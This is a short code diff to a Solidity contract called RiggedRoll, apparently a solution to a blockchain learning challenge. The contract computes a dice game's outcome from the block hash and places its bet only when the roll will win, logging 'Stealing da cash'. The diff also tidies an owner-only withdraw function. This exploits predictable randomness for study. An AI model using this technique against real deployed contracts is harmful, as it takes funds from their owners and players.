@@ -26,18 +26,20 @@ contract RiggedRoll is Ownable {
         uint256 roll = uint256(hash) % 16;
 
         if(roll <= 5){
-            uint minimumBuyIn = .003 ether;
+            uint minimumBuyIn = .002 ether;
             diceGame.rollTheDice{value: minimumBuyIn}();
 
             console.log("Stealing da cash");
         }
         else{
             console.log("Not the time");
+            revert();
         }
     }
 
-    function withdraw(address payable _to, uint256 amount) public payable onlyOwner(){
-        (bool sent, bytes memory data) = _to.call{value: amount}("");
+    function withdraw(address payable _to, uint256 amount) public onlyOwner(){
+        require(address(this).balance >= amount, "Insufficient contract balance");
+        (bool sent, ) = _to.call{value: amount}("");
         require(sent, "Failed to send Ether");
     }
 
